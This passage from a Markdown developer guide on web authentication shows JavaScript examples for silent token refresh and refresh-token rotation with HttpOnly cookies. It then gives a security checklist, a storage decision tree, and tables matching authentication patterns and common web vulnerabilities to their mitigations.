        window.location.href = '/login';
        return Promise.reject(refreshError);
        
      } finally {
        isRefreshing = false;
      }
    }
    
    return Promise.reject(error);
  }
);

// Usage
async function fetchUserData() {
  const response = await api.get('/user/profile');
  return response.data;
}
```

### Token Rotation (Extra Security)

```javascript
// Backend: Issue new refresh token on each refresh
app.post('/api/refresh', async (req, res) => {
  const oldRefreshToken = req.cookies.refreshToken;
  
  // Verify old token
  const payload = jwt.verify(oldRefreshToken, REFRESH_TOKEN_SECRET);
  
  // Delete old refresh token
  await deleteRefreshToken(oldRefreshToken);
  
  const user = await getUserById(payload.userId);
  
  // Generate NEW tokens
  const accessToken = generateAccessToken(user);
  const newRefreshToken = generateRefreshToken(user);
  
  // Save new refresh token
  await saveRefreshToken({
    userId: user.id,
    token: newRefreshToken,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
  });
  
  // Send new refresh token as cookie
  res.cookie('refreshToken', newRefreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000
  });
  
  res.json({ accessToken });
});
```

### Best Practices Summary

```javascript
// ✅ Recommended Token Lifetimes
const TOKEN_LIFETIMES = {
  accessToken: '15m',        // 15 minutes
  refreshToken: '7d',        // 7 days
  rememberMe: '30d'          // 30 days (if implemented)
};

// ✅ Security Checklist
const SECURITY_CHECKLIST = {
  accessToken: {
    lifetime: 'Short (5-15 minutes)',
    storage: 'Memory only (React state)',
    transmission: 'Authorization header'
  },
  refreshToken: {
    lifetime: 'Long (7-30 days)',
    storage: 'HttpOnly cookie',
    transmission: 'Cookie (automatic)',
    rotation: 'Yes (issue new on refresh)',
    revocation: 'Store in DB for instant invalidation'
  },
  general: {
    https: 'Always use HTTPS in production',
    sameSite: 'Use SameSite=Strict',
    cors: 'Restrict CORS properly',
    rotation: 'Rotate refresh tokens',
    monitoring: 'Log token usage patterns'
  }
};
```

---

## 🎯 Quick Reference

### Storage Decision Tree

```
Need to store data?
├─ Is it sensitive (tokens, passwords)?
│  ├─ YES → Use HttpOnly Cookies (server-side only)
│  └─ NO → Continue
├─ Data size?
│  ├─ < 4KB → Cookies (if needs server access)
│  ├─ < 10MB → LocalStorage/SessionStorage
│  └─ > 10MB → IndexedDB
├─ Lifetime?
│  ├─ Forever → LocalStorage
│  ├─ Session only → SessionStorage
│  └─ Until logout → Memory + Refresh token pattern
└─ XSS Protection needed?
   ├─ YES → HttpOnly Cookies or Memory only
   └─ NO → LocalStorage acceptable (for non-sensitive data)
```

### Authentication Pattern Selector

| Scenario | Recommended Pattern |
|----------|---------------------|
| Traditional web app | Session-based with HttpOnly cookies |
| SPA (Single Page App) | JWT in memory + Refresh token in HttpOnly cookie |
| Mobile app | JWT with refresh tokens |
| API for third parties | JWT without refresh (API keys alternative) |
| Microservices | JWT with shared secret or asymmetric keys |
| High security (banking) | Session-based with additional 2FA |

### Common Vulnerabilities

| Attack | Vulnerable Storage | Mitigation |
|--------|-------------------|------------|
| **XSS** | LocalStorage, SessionStorage, Non-HttpOnly cookies | Use HttpOnly cookies, CSP headers |
| **CSRF** | Cookies without SameSite | Use SameSite=Strict, CSRF tokens |
| **Token theft** | LocalStorage | Store in memory, use short expiration |
| **Man-in-the-Middle** | Any non-HTTPS | Always use HTTPS, Secure flag |
| **Session fixation** | Predictable session IDs | Use crypto-random IDs, regenerate on login |

---

## 📖 Additional Resources

### Official Documentation
- [MDN Web Docs - HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [JWT.io - JSON Web Tokens](https://jwt.io/)

### Security Standards
- [RFC 6749 - OAuth 2.0](https://datatracker.ietf.org/doc/html/rfc6749)
- [RFC 7519 - JWT](https://datatracker.ietf.org/doc/html/rfc7519)
- [Same-Site Cookie Specification](https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis)

### Testing Tools
- [OWASP ZAP](https://www.zaproxy.org/) - Security testing
- [jwt.io Debugger](https://jwt.io/#debugger) - JWT validation
- [Burp Suite](https://portswigger.net/burp) - Web security testing

---

## 🤝 Contributing

Found an issue or want to add more examples? This guide is open for improvements!

## 📄 License

MIT License - Feel free to use this guide for learning and reference.

---

**Made with ❤️ for frontend security enthusiasts**